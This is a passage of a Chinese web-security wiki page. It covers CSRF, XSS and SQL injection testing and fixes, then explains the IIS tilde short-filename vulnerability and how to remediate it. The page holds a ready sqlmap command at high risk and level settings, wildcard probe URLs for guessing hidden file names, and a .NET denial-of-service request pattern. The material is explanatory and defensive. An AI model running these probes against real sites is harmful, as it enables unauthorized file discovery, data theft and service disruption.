2.更改和删除 csrf_token 后提交表单，查看请求是否能被正确响应。<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/>
1.对涉及数据<strong>增、删、改</strong>操作提交的表单中添加csrf_token，token 参数应校验一次后失效。<br/>
2.最好是在容器或框架上<strong>全局</strong>启用 csrf_token。(很多框架自带的解决办法容易遗漏一次失效的问题)<br/>
3.token 应有一定的<strong>时效性</strong>，建议为30分钟，过期需失效（即：单页面停留30分钟后，用户提交请求需提示“页面过期，请刷新页面后再次提交”）<br/></li>
</ul>

<hr/>

<ul>
<li>参考<br/>
<a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)">CSRF测试</a><br/>
<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">跨站请求伪造（CSRF）</a><br/>
<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">CSRF 攻击的应对之道</a><br/>
## XSS跨站脚本攻击<br/>
### 反射型</li>
<li>原理<br/></li>
</ul>

<hr/>

<ul>
<li>检测方法<br/>
<strong>检测场景</strong>：任何有输入输出地方......<br/>
1.使用通用的web扫描器一般的都能发掘潜在的反射型XSS漏洞。<br/>
2.手工在一些输入框中或者post参数中加入拼凑过的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在。<br/>
3.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的，反射型的XSS一般依赖于该次请求，且同时只能被用户自己所看到。<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/>
1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
</ul>

<hr/>

<h3 id="toc_1">存储型</h3>

<ul>
<li>原理<br/></li>
</ul>

<hr/>

<ul>
<li>检测方法<br/>
<strong>检测场景</strong>：存在富文本编辑器的地方；用户的输入信息会作为固定的值回显到页面中；后台管理应用中维护用户输入的相关信息。<br/>
1.手工在一些输入框中或者post参数中加入污染的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在(注入前端转义的情况)。<br/>
2.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的。<br/>
3.如果尝试注入的代码在页面中均被html编码，则再考虑其数据的流转会不会在后台其他应用中处理这些输入数据，如果有，对应的后台应用是否也做了完善的过滤机制。<br/>
4.可远程搭建XSS检测平台，如果有XSS测试代码被触发，则自动发起链接到该平台上，这样相对来说可以测试那些未知的数据流向是否造成问题。<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/>
1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
</ul>

<hr/>

<h3 id="toc_2">基于DOM型</h3>

<ul>
<li>原理<br/></li>
</ul>

<hr/>

<p>没啥可说的，可以当成是特殊的反射型。</p>

<ul>
<li>检测方法<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/></li>
</ul>

<hr/>

<ul>
<li>参考<br/>
<a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS跨站脚本</a>
## SQL_Inject<br/></li>
<li>原理<br/></li>
</ul>

<hr/>

<p>开发人员使用直接拼接 sql 的方法来访问数据库，导致攻击者能通过特殊构造的语句控制代码逻辑。典型的代码与数据没有分离导致的安全问题之一。</p>

<ul>
<li>检测方法<br/></li>
</ul>

<hr/>

<ul>
<li>常规方法<br/>
<code>
1 ，新建一个1 .txt文件，burp抓包将包含关键参数的请求存入。<br/>
2 ，使用sqlmap 进行扫描（python sqlmap [options] [file path]）<br/>
3、等待结果输出
</code></li>
<li>另一种常规方法<br/>
<code>
使用burp插件SQLiPy<br/>
方案一（通用）：将sqlapi地址配置成 192.168.2.22 2222<br/>
方案二：使用sqlipy生成测试语句，然后添加 -p 参数，指定注入参数，然后在 shell 里面运行 sqlmap。<br/>
一个指定参数的SqlMap示例语句：    <br/>
sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- cookie = “SESSIONID = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;<br/>
--user-agent= &quot;Mozilla / 5.0（X11; Linux_x86_64; RV：60.0）/ 20100101火狐/ 60.0&quot;  --delay=0 --timeout=30 --retries=0 --dbms=&quot;MySQL&quot;  --os=Linux   <br/>
--level=3 --risk=3 --threads=2 --time-sec=10 -b --batch --answers=&quot;crack=N,dict = N&quot;  -p &quot;zone_id&quot; --tables           
</code>
我们在跑注入的时候需要重点设置的参数：<br/>
-risk=3<br/>
-level=3<br/>
--threads=2<br/>
--dbms和–os去问开发或者测试<br/>
-p 指定阐述减少服务器压力</li>
<li>不太常规的方法<br/>
1、写一个web界面调用sqlmapapi<br/>
2、直接找开发拉代码过来进行审计</li>
<li>修复方案<br/></li>
</ul>

<hr/>

<p>1、使用安全的API ，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM 或实体框架(通常开发框架里会自带访问sql的方法来预防注入)。<br/><br/>
2、做参数绑定，预编译查询。PHP推荐使用PDO进行防注入<br/>
3、若不具备开发条件，可以使用 waf 进行防御。</p>

<ul>
<li>参考<br/>
<a href="https://www.owasp.org/index.php/SQL_Injection">SQL注入</a></li>
</ul>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:42 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446866501207.html">
                
                  <h1>IIS短文件名漏洞</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<h2 id="toc_0">漏洞原理</h2>

<hr/>

<p>windows在创建一个新文件时，操作系统还会生成 8.3 格式的兼容 MS-DOS 的（短）文件名，以允许基于 MS-DOS 或16位 windows 的程序访问这些文件。    </p>

<h2 id="toc_1">利用场景</h2>

<hr/>

<p>1、用于猜解文件/文件名<br/><br/>
2、.Net Framework 的拒绝服务攻击（不常见）</p>

<h2 id="toc_2">检测方法</h2>

<hr/>

<p><strong>黑盒测试</strong><br/><br/>
使用<a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS短文件名扫描器</a><br/><br/>
<strong>白盒测试</strong><br/>
几乎所有的 windows 操作系统，在 cmd 中使用命令：</p>

<pre class="line-numbers"><code class="language-bat">dir /x
</code></pre>

<p>如图：<br/>
<figure><img src="media/15446866501207/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%BE%E7%A4%BA.png" alt="短文件名显示"/><figcaption>短文件名显示</figcaption></figure></p>

<h2 id="toc_3">修复方案</h2>

<hr/>

<p>1、升级 .net framework 至 4.0 版本或以上<br/><br/>
2、修改注册表键值<br/><br/>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 修改NtfsDisable8dot3NameCreation为1。（此项默认为0）<br/><br/>
此设置用于禁用短文件名功能，重启后生效。<br/><br/>
或者通过 CMD 命令：    </p>

<pre class="line-numbers"><code class="language-txt">Windows Server 2008 R2
查询是否开启短文件名功能：fsutil 8dot3name query
关闭该功能：fsutil 8dot3name set 1

Windows Server 2003
关闭该功能：fsutil behavior set disable8dot3 1
</code></pre>

<p>以上操作只能防止新创建的文件/文件名不会出现短文件名，而当前文件/文件名依然保持短文件名。完整解决方案还需要如下操作：<br/><br/>
3、<br/><br/>
　　a、从当前目录中创建一个副本,并将其重命名为 tempNew；<br/><br/>
　　b、将当前目录重命名为“tempOld”；<br/><br/>
　　c、将“tempNew”重命名为原来的目录名。<br/><br/>
4、禁止 url 中使用 “~” 或它的 Unicode 编码。（IIS7.0的请求阻塞不能完全阻止“~”波浪号。）</p>

<hr/>

<hr/>

<hr/>

<h2 id="toc_4">背景知识</h2>

<hr/>

<p>windows 支持的长文件名最多为 255 个字符。windows 还以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 windows 的程序访问这些文件。<br/><br/>
8.3格式短文件名规范中：<br/><br/>
‘8’是指文件名或目录名的主体部分小于等于 8 个字节；‘3’是指文件名的扩展名部分小于等于 3 个字节。<br/><br/>
windows 会按以下方式从长文件名生成短文件名：<br/><br/>
windows 首先会删除文件名中的任何无效字符和空格。无效字符包括：</p>

<pre class="line-numbers"><code class="language-txt">.&quot;/\[]:;=,
</code></pre>

<p>由于短文件名只能包含一个英文句点（.），因此 windows 将删除文件名中的其他英文句点，即使文件名中最后一个英文句点后面是有效的非空格字符也是如此。例如：windows 从长文件名 This is a really long filename.123.456.789.txt 生成短文件名 Thisis~1.txt 否则，windows 将忽略最后一个英文句点，而使用倒数第二个英文句点。例如：windows从长文件名 This is a really long filename.123.456.789. 生成短文件名 Thisis~1.789。<br/><br/>
生成短文件名若需要复制的话，windows 将文件名截断为 6 个字符，并在后边附加一个波形符号（~）和一个数字（创建的每一个以 ~1 结尾的唯一文件名，复制文件以 ~2、~3等结尾。）    </p>

<h2 id="toc_5">影响范围</h2>

<hr/>

<p>Windows 10 Pro released in July 2015Windows 10 Enterprise released in July 2015Microsoft Windows Server 2003 Standard EditionMicrosoft Windows Server 2003 Enterprise EditionMicrosoft Windows Server 2003 Datacenter EditionMicrosoft Windows Server 2003 Web EditionMicrosoft Windows Server 2003, Enterprise x64 EditionMicrosoft Windows Small Business Server 2003 Standard EditionMicrosoft Windows Small Business Server 2003 Premium EditionMicrosoft Windows XP Home EditionMicrosoft Windows XP Professional EditionMicrosoft Windows Datacenter Server Limited EditionMicrosoft Windows Advanced Server, Limited EditionMicrosoft Windows 2000 ServerMicrosoft Windows 2000 Advanced ServerMicrosoft Windows 2000 Professional EditionMicrosoft Windows NT Workstation 3.5Microsoft Windows NT Workstation 3.51Microsoft Windows NT Workstation 4.0 开发员版Microsoft Windows NT Server 3.51Microsoft Windows NT Server 4.0 Standard EditionWindows Vista Service Pack 2Windows Vista BusinessWindows Vista EnterpriseWindows Vista Home PremiumWindows Vista UltimateWindows Server 2008 Service Pack 2Windows Server 2008 StandardWindows Server 2008 EnterpriseWindows Server 2008 DatacenterWindows Server 2008 for Itanium-Based SystemsWindows 7 Service Pack 1Windows 7 Home PremiumWindows 7 ProfessionalWindows 7 EnterpriseWindows 7 UltimateWindows Server 2008 R2 Service Pack 1Windows Server 2008 R2 StandardWindows Server 2008 R2 EnterpriseWindows Server 2008 R2 DatacenterWindows Server 2008 R2 for Itanium-Based SystemsWindows 8 EnterpriseWindows 8 ProWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 Datacenter<br/>
列表内所有操作系统均受影响（数据来源日期：20171213）<br/><br/>
该漏洞有其局限性：<br/><br/>
1、只能猜解文件/文件夹名前六位，以及扩展名前三位<br/><br/>
2、名称较短的文件是没有响应的短文件名的<br/><br/>
3、需要 IIS 和 .net 同时满足。  </p>

<h2 id="toc_6">漏洞详情</h2>

<hr/>

<p>在 windows 上的 Apache（Apache支持短文件名）上运行的 web 应用程序正在创建一个长文件名文件（如sql备份文件或会话文件，假设文件名是 backup-082119f75623eb7abd7bf357698ff66c.sql，windows 将创建短文件名 BACKUP〜1.SQL）。这种情况下，如果我们用短文件名访问这个文件，那么就有可能获取这个包含sql数据库备份的文件。<br/><br/>
比较著名的一个例子：<br/><br/>
wordpress 有一个备份博客的插件，该插件会为备份创建一个自定义目录（backup-88456）。备份完成后，该目录包含一个名为 wordpress_wp_20120702_576.sql 的文件  ，即 WordPress 数据库备份。这本应该难以猜测的，因为我们的目录名称中有5个数字加上日期和另外3个数字，即使忽略日期也至少有 100,000,000 个组合。然而由于短文件名的原因，目录名会变成 BACKUP~1 而文件名会变成 WORDPR~1.SQL。100,000,000 个组合被缩减为一个组合。    </p>

<h2 id="toc_7">漏洞利用</h2>

<hr/>

<p><strong>短文件名漏洞</strong><br/>
漏洞利用需要使用到通配符。在 windows 中，* 可以匹配n个字符（n可以为0,一个星号和n个星号的意义一样）。判断某站点是否存在 IIS 短文件名爆破，构造如下payload：    </p>

<pre class="line-numbers"><code class="language-http">1. http://www.xxx.com/*~1*/.aspx
2. http://www.xxx.com/l1j1e*~1*/.aspx
</code></pre>

<p>若1返回404而2返回400，则可以判断目标站点存在漏洞。<br/><br/>
判断漏洞存在后，继续猜解目录下是否存在a开头的文件或文件夹，访问：    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/a*~1*/.aspx
</code></pre>

<p>若存在将返回404，不存在则返回400。以此类推，不断向下猜解所有的6个字符。<br/><br/>
到此要考虑两种情况，若abcdef开头的是一个文件夹则    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*/~1/.aspx
</code></pre>

<p>返回404。若abcdef开头的是一个文件，则    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1/.aspx
</code></pre>

<p>返回404（注意！返回404表示存在）同理我们可以猜出文件后缀名：    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1*h*/.aspx
</code></pre>

<p>若返回404则代表扩展名中肯定存在h字符。<br/><br/>
利用此漏洞可以猜解后台地址、敏感文件/文件名（如备份的rar、bak、sql等）；某些情况下，可以通过短文件名漏洞直接下载对应的文件（如备份sql文件）。<br/><br/>
<br><br/>
<strong>.Net Framework 拒绝服务攻击</strong><br/><br/>
当请求文件夹名称包含 ~1 的请求，会导致不存在该文件的 .Net Framework 去递归查询所有根目录。如果只有一个“~1”是无效的，当“~1”大于一个，比如像这样：        </p>

<pre class="line-numbers"><code class="language-http">\wwwtest\fuck~1\~1\~1\~1.aspx
</code></pre>

<p>此时文件系统会这样调用：    </p>

<pre class="line-numbers"><code class="language-txt">\wwwtest                           SUCCESS
\wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
\wwwtest\fuck~1                    NAME NOT FOUND
\wwwtest\fuck~1\~1\                PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
\wwwtest\fuck~1\~1                 PATH NOT FOUND
\wwwtest\fuck~1                    NAME NOT FOUND
\wwwtest                           SUCCESS
\wwwtest                           SUCCESS
</code></pre>

<p>如果我们请求的文件/文件夹名同时存在大小写时，这个请求会被请求两次，一次是原封不动的请求，一次是全部使用小写的请求。<br/><br/>
下表显示了每个请求的FS调用的数量（Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同)）<br/><br/>
<figure><img src="media/15446866501207/F5%E8%B0%83%E7%94%A8.png" alt="F5调用"/><figcaption>F5调用</figcaption></figure></p>

<p>这个问题适用于当时的 .Net framework 的所有版本(<br/><br/>
    IIS 1.0, Windows NT 3.51<br/><br/>
    IIS 2.0, Windows NT 4.0<br/><br/>
    IIS 3.0, Windows NT 4.0 Service Pack 2<br/><br/>
    IIS 4.0, Windows NT 4.0 Option Pack<br/><br/>
    IIS 5.0, Windows 2000<br/><br/>
    IIS 5.1, Windows XP Professional and Windows XP Media Center Edition<br/><br/>
    IIS 6.0, Windows Server 2003 and Windows XP Professional x64 Edition<br/><br/>
    IIS 7.0, Windows Server 2008 and Windows Vista<br/><br/>
    IIS 7.5, Windows 7 (error remotely enabled or no web.config)<br/><br/>
    IIS 7.5, Windows 2008 (classic pipeline mode))<br/><br/>
只是 F5 的调用次数会有不同。    </p>

<h2 id="toc_8">参考链接</h2>

<hr/>

<ul>
<li><a href="http://www.lijiejie.com/iis-win8-3-shortname-brute/">http://www.lijiejie.com/iis-win8-3-shortname-brute/</a><br/></li>
<li><a href="https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/">https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/</a><br/></li>
<li><a href="http://www.freebuf.com/articles/4908.html">http://www.freebuf.com/articles/4908.html</a><br/></li>
<li><a href="https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions">https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions</a><br/></li>
<li><a href="https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a><br/></li>
</ul>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:37 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
              


			<div class="row">
			  <div class="large-6 columns">
			  <p class="text-left" style="padding-top:25px;">
			   <a href="Web安全_3.html">&laquo; Prev Page</a>  
			  </p>
			  </div>
			  <div class="large-6 columns">
			<p class="text-right" style="padding-top:25px;">
			 <a href="Web安全_5.html">&raquo; Next Page</a> 
			</p>
			  </div>
			</div>
		</div>
	</div><!-- large 8 -->

 <div class="large-4 medium-4 columns">
  <div class="hide-for-small">
    <div id="sidebar" class="sidebar">
          <div id="site-info" class="site-info">
            
                <div class="site-a-logo"><img src="http://images.lonelyor.org/favicon.jpg" /></div>
            
                <h1>lonelyorWiki</h1>
                <div class="site-des">一个用来记录知识的网站</div>
                <div class="social">









<a target="_blank" class="github" target="_blank" href="https://github.com/AlShelley/lonelyorWiki" title="GitHub">GitHub</a>
<a target="_blank" class="email" href="mailto:lonelyor.org@gmail.com" title="Email">Email</a>
  <a target="_blank" class="rss" href="atom.xml" title="RSS">RSS</a>
                
              	 </div>
          	</div>

             

              <div id="site-categories" class="side-item ">
                <div class="side-header">
                  <h2>Categories</h2>
                </div>
                <div class="side-content">

      	<p class="cat-list">
        
            <a href="%E7%B3%BB%E7%BB%9F.html"><strong>系统</strong></a>
        
            <a href="%E7%BD%91%E7%BB%9C.html"><strong>网络</strong></a>
        
            <a href="%E5%BC%80%E5%8F%91.html"><strong>开发</strong></a>
        
            <a href="%E5%B7%A5%E5%85%B7.html"><strong>工具</strong></a>
        
            <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
        
            <a href="Web%E5%AE%89%E5%85%A8.html"><strong>Web安全</strong></a>
        
            <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
        
            <a href="%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html"><strong>星火流萤</strong></a>
         
        </p>


                </div>
              </div>

              <div id="site-categories" class="side-item">
                <div class="side-header">
                  <h2>Recent Posts</h2>
                </div>
                <div class="side-content">
                <ul class="posts-list">
	      
		      
			      <li class="post">
			        <a href="15590908841596.html">学习的深度和广度</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15590262822391.html">洞察-宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台的安装与使用</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15589173721679.html">svn 报错：“svn: E155015: Commit failed (details follow):svn: E155015: Aborting commit: '/Users/lonelyor/xxx.xls' remains in conflict” 解决方法</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15586769387988.html">Markdown XSS Payloads</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15586660103989.html">使用GET方法传输用户账号密码的危害</a>
			      </li>
		     
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		   
		  		</ul>
                </div>
              </div>
        </div><!-- sidebar -->
      </div><!-- hide for small -->
</div><!-- large 4 -->

</div><!-- row -->

 <div class="page-bottom clearfix">
  <div class="row">
   <p class="copyright">Copyright &copy; 2018
Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
Theme used <a target="_blank" href="http://github.com">GitHub CSS</a>.</p>
  </div>
</div>

        </section>
      </div>
    </div>

  
    

    <script src="asset/js/foundation.min.js"></script>
    <script>
      $(document).foundation();
      function fixSidebarHeight(){
        var w1 = $('.markdown-body').height();
          var w2 = $('#sidebar').height();
          if (w1 > w2) { $('#sidebar').height(w1); };
      }
      $(function(){
        fixSidebarHeight();
      })
      $(window).load(function(){
          fixSidebarHeight();
      });
     
    </script>

    



  </body>
</html>
